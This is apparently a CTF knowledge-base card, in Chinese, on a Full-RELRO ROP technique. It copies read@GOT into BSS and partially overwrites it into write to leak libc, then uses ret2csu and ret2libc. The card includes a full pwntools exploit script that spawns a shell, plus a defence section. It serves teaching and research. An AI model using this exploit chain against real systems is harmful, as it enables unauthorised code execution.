---
id: binary-pwn-rop-full-relro-bss-got-pointer-copy-low2-read-to-write-leak
title: FULL RELRO 且无输出函数：借程序内指针搬运函数把 read@GOT 复制到 BSS，低位覆盖 read→write 泄露 libc 后 ret2libc
type: scenario
domain: binary
path: binary/pwn/rop
technique: full-relro-bss-pointer-copy-got-low2-overwrite-read-to-write-leak
tags:
- pwn
- rop
- ret2csu
- full-relro
- bss
- got
- partial-overwrite
- libc-leak
- ret2libc
- ctf
- x86-64
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V697
  verified_at: '2026-11-13T18:14:22+08:00'
  notes: 已对照原文全文与 8 图核对：checksec Full RELRO/NX/No PIE/No canary、main read(0,buf,0x100) 溢出偏移 0x18、sub_400606 指针搬运逻辑（v4=*(0x601040+a1); 0x601040=v4; a2==1 时 0x601028[a3]=v4）与 exp 四轮 csu 参数（read(0,0x601040,0x100) 写 [read_got,backdoor] -> csu 调 [0x601048]=backdoor 搬运 read_addr -> read(0,0x601040,0x20) 低 2 字节覆盖 0x4a20 -> csu 调 [0x601040]=write 泄 read@got）均与原文一致；img03/04 显示 0x601040->0x600fd8(read)->read，img05 显示 0x601028/0x601040 均为 read 且 0x601048=0，img06 显示 0x601040->write(0x...4a20)，img07 收到 0x20 字节并算出 libc_base，img08 whoami 成功。1/16 概率模型核对成立：read/write 偏移差 0xa0、libc 基址页对齐故低 16 位 16 种、固定写 0x4a20 仅基址低 16 位为 0 时命中。dedup 对 binary-pwn-rop-bss-stdout-pointer-magic-gadget-leak-orw 为 related 非 duplicate：该卡用 add dword ptr [rbp-0x3d],ebx 加写 .bss stdout 指针合成输出函数，本卡用程序自带搬运函数复制 read@GOT 后低 2 字节覆盖，原语/PoC/失败模式不同，dedup_review 理由成立；dup-scan.json 无涉及本卡 pair。原文仅 '版本:ubuntu22' 为目标环境，非受影响组件版本，未设 affected_versions。未验证点：PoC 未本机复跑；CTF 题无 CVE；frontmatter 无 sources/source_url（工具禁止 frontmatter 含 sources/source）。
url: /docs/binary/pwn/rop/binary-pwn-rop-full-relro-bss-got-pointer-copy-low2-read-to-write-leak/
draft: false
kb_aliases:
- FULL RELRO 下的低位覆盖
- 巅峰极客 linkmap
- sub_400606 指针搬运
- 0x601040 read 改 write
- GOT 复制到 BSS
- 低两字节覆盖 libc 函数
- ret2csu 无输出函数泄露
---

## 一句话结论

在 FULL RELRO（GOT 只读）、没有导入任何输出函数、只有 `read(0, buf, 0x100)` 栈溢出的 64 位非 PIE 题中，可先用程序自带的“指针搬运”函数 `sub_400606` 把 `read@GOT` 里的 `read` 真实地址复制到可写 BSS 指针 `0x601040`，再用一次 `read` 向其低 2 字节写入 `write` 的低 16 位偏移（read/write 在同一 64KB 窗口，基址低 16 位有 16 种可能，1/16 命中），随后经 ret2csu 的 `call [r12]` 调用被改造成 `write` 的指针，`write(1, read@got, n)` 输出 GOT、泄露 libc，最后转常规 ret2libc 拿 shell（2023 巅峰极客 linkmap）。

## 原理

- **困境**：`checksec` 为 Full RELRO + NX + No PIE + No canary；`main` 只有 `read(0, buf, 0x100)`（`buf` 仅 16 字节）栈溢出。Full RELRO 让 GOT 只读，不能再像 Partial RELRO 那样把 `read@got` 改成 `system`；同时程序只导入了 `read`、`setvbuf`、`__isoc99_scanf`、`__libc_start_main`，**没有任何 write/puts/printf 输出函数**，也就没有现成的泄露原语。
- **程序内的“指针搬运”函数**：`sub_400606(a1,a2,a3)` 的逻辑是 `v4 = *(qword_601040 + a1); qword_601040 = v4; dword_601048 = a1; if (a2==1) qword_601028[a3] = v4; else if (!a2) qword_601020[a3] = v4; return v4;`。其中 `qword_601040` 是 BSS 上的一个指针槽：
  - 先通过 CSU 调用 `read(0, 0x601040, 0x100)`，把 `p64(read_got) + p64(backdoor)` 写进 `0x601040/0x601048`；
  - 再让 CSU 以 `a1=0, a2=1, a3=0` 调用 `[0x601048]`（即 `sub_400606` 自身）：`v4 = *(read_got) = read_addr`，于是 `qword_601040 = read_addr`——**GOT 里的 libc 函数真实地址被搬到了可写 BSS 指针里**。
  - 这一步不需要知道 libc 基址：只是把只读 GOT 的值复制到可写内存，破解了 Full RELRO“GOT 不可写”的限制。
- **低 2 字节把 read 改成 write**：拿到 BSS 里的 `read_addr` 后，再用一次 CSU 调 `read(0, 0x601040, 0x20)`，只发送 `p16(0x4a20)` 覆盖指针最低 2 字节。`read` 与 `write` 都在 libc、偏移只差 0xa0（样例 `read=0x...4980`、`write=0x...4a20`，落在同一 64KB 窗口），所以低 16 位至多是“基址低 16 位页号 + 固定偏移”；libc 基址按页对齐（低 12 位为 0），基址低 16 位有 `0x0000/0x1000/.../0xf000` 共 16 种，覆盖成固定值 `0x4a20` 只有 1/16 概率命中（原文“因为 ASLR 只是有几率覆盖成功”即指此）。这就是“FULL RELRO 下的低位覆盖”的核心。
- **调用改写后的指针泄露**：CSU 的 `call qword ptr [r12+rbx*8]` 可以直接 call 内存中的指针。令 `r12=0x601040`、`rdi=1`、`rsi=read_got`、`rdx=0x20`，即调用 `write(1, read@got, 0x20)`，把 `read` 真实地址输出到 socket；`libc_base = leak - libc.sym['read']`。
- **回归主函数多轮复用**：CSU 段末尾 `rbx=0, rbp=1` 使其只 call 一次后继续走到 `add rsp,8; pop×6; ret`，`last` 设为 `main` 回主函数再读一轮，因此整条链可以拆成“写 BSS → 搬指针 → 改低位 → 调用泄露 → ret2libc”多轮，每轮都从同一个栈溢出进入。
- **最后常规 ROP**：泄露后 `system = base + libc.sym['system']`、`binsh = base + next(libc.search(b'/bin/sh'))`，`ret×3 + pop rdi + binsh + system` 拿 shell。
- 成立前提：非 PIE（BSS/代码地址固定）、目标 libc 版本中 read 与目标输出函数距离足够近（同一 64KB 窗口）、可承受 1/16 的单次成功率（失败重连/重跑）。

## 触发条件

- 64 位 ELF：Full RELRO、NX、非 PIE，存在可控栈溢出（本题 `read(0, buf, 0x100)`，`buf` 0x10，返回地址偏移 0x18）。
- 程序未导入任何输出函数，但 GOT 中存在可用的 libc 函数（如 `read`）可被复制。
- 程序内存在“读取指针所指值并写回可写内存/返回该值”的搬运函数，或其它能把 GOT 值搬到可写内存的原语。
- 存在 ret2csu 的 `pop6` + `call [r12+rbx*8]` 段（或等价间接调用 gadget）。
- 目标 libc 的读函数与某输出函数在同一 64KB 窗口，且已知其低 16 位偏移；允许 1/16 概率重试。

## 利用步骤

1. 逆向量化：确认 `main` 栈溢出偏移 0x18（`0x10` buf + 8 saved rbp），确认无输出函数、Full RELRO、非 PIE；记下 `key=0x601040`、`read_got`、`backdoor=sub_400606`、CSU 前后端地址。
2. 第一轮：`overflow + csu(0, 1, read_got, rdi=0, rsi=key, rdx=0x100, main)` 调用 `read(0, key, 0x100)`，发送 `p64(read_got) + p64(backdoor)`，在 BSS 布置“指针源 + 函数指针”。
3. 第二轮：`csu(0, 1, key+8, rdi=0, rsi=1, rdx=0, main)` 调用 `sub_400606(0,1,0)`，把 `read_addr` 搬进 `key`。
4. 第三轮：`csu(0, 1, read_got, rdi=0, rsi=key, rdx=0x20, main)` 调 `read(0, key, 0x20)`，发送 `p16(0x4a20)` 覆盖 `key` 指向地址的低 2 字节（read→write）。
5. 第四轮：`csu(0, 1, key, rdi=1, rsi=read_got, rdx=0x20, main)` 调用 `write(1, read@got, 0x20)`，接收 `read` 真实地址，计算 libc 基址。
6. 第五轮：用 `ret × 3 + pop rdi + /bin/sh + system` 覆盖返回地址，进 shell。若第 4 步后崩溃/无输出，说明低 16 位没命中，重连重试（约 16 次期望）。

## PoC

```python
from pwn import *
context.arch = 'amd64'
p = process('./pwn')          # 远程换 remote(...)
elf = ELF('./pwn'); libc = ELF('./libc.so.6')

pop_rdi = 0x4007e3; ret = 0x400773
main    = 0x400740; key = 0x601040
read_got = 0x600FD8; backdoor = 0x400606
csu_front, csu_end = 0x4007C0, 0x4007DA

# 注意：本例 helper 实际参数顺序为 (rbx, rbp, r12, rdi, rsi, rdx, last)
# csu_front: mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]; ...
def csu(rbx, rbp, r12, rdi, rsi, rdx, last):
    return flat(csu_end, rbx, rbp, r12, rdx, rsi, rdi, csu_front, b'a'*0x38, last)

# 1) read(0, key, 0x100) 布置 [read_got, backdoor]
p.send(b'a'*0x18 + csu(0, 1, read_got, 0, key, 0x100, main))
p.send(flat(read_got, backdoor))

# 2) 调 sub_400606(0,1,0)：key = *(read_got) = read_addr
p.send(b'a'*0x18 + csu(0, 1, key+8, 0, 1, 0, main))

# 3) read(0, key, 0x20)：低 2 字节覆盖 read_addr -> write_addr（1/16）
p.send(b'a'*0x18 + csu(0, 1, read_got, 0, key, 0x20, main))
p.send(p16(0x4a20))

# 4) 调 write(1, read@got, 0x20) 泄露 libc
p.send(b'a'*0x18 + csu(0, 1, key, 1, read_got, 0x20, main))
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['read']

# 5) ret2libc
system = libc_base + libc.sym['system']
binsh  = libc_base + next(libc.search(b'/bin/sh'))
p.send(b'a'*0x18 + p64(ret)*3 + p64(pop_rdi) + p64(binsh) + p64(system))
p.interactive()
```

```text
# 预期：第 4 步 recv 到 read 的真实地址；libc_base 打印后 whoami 回显当前用户。
# 若第 4 步无输出/崩溃：低 16 位未命中，重跑重试（命中率约 1/16）。
```

## 变体与关联

- 变体：`read` 可换成其他“先读入数据”的 libc 函数，再低位改造成任一同一 64KB 窗口内的输出/执行函数；也可只把低 16 位改成 syscall gadget 附近的地址。
- 变体：程序内没有搬运函数时，可用任意读原语（格式化字符串、OOB）先读 GOT，或用 `.bss` 中现成的 libc 指针（`stdout`/`stdin`）经加写改造（[[binary-pwn-rop-bss-stdout-pointer-magic-gadget-leak-orw]]）。
- 关联：[[binary-pwn-rop-magic-gadget-csu-bss-write-orw-no-libc-leak]]（同环境无泄露，但方向是加写 BSS 伪造数据、不泄 libc）；[[binary-pwn-rop-alarm-got-syscall-ret2csu-orw]]（对 `alarm@GOT` 做单字节改造拿 syscall）；[[binary-pwn-rop-ret2csu-write-got-leak-ret2libc]]（有 write@plt 时的经典 ret2csu 泄露）；[[binary-pwn-stack-pie-partial-overwrite-low2-bytes-1-in-16-brute]]（同 1/16 部分覆盖概率模型，但目标是 PIE 代码返回地址）。
- 边界：目标为 PIE 时 BSS/代码地址随机化，需先泄露；libc 版本不同则低 16 位常量不同；read 与目标函数不在同一 64KB 窗口时低 2 字节覆盖不成立；程序若导入了任何输出函数则直接走经典泄露即可。

## 检测与防御

- 出题/加固：开启 PIE 让 BSS 与代码地址随机化；Full RELRO 之外还要消除“GOT 值可被搬到可写内存”的任意读/搬运函数；开启 Canary；NX。
- 防御：不要为方便在二进制中保留“解引用任意 BSS 指针并返回”的辅助函数；链接时移除 CSU 段不能可靠阻止（仍有等价 gadget），核心是消除栈溢出与地址可预测性。
- 检测（CTF/研究环境）：崩溃栈中出现 BSS 地址（0x601040 一类）作为 r12/rbp、`call [r12]` gadget、对 BSS 中 libc 指针的 2 字节写入；进程反复从 `main` 重入并伴随 `read` 调用；输出流中出现 GOT 内容（libc 地址字节）。
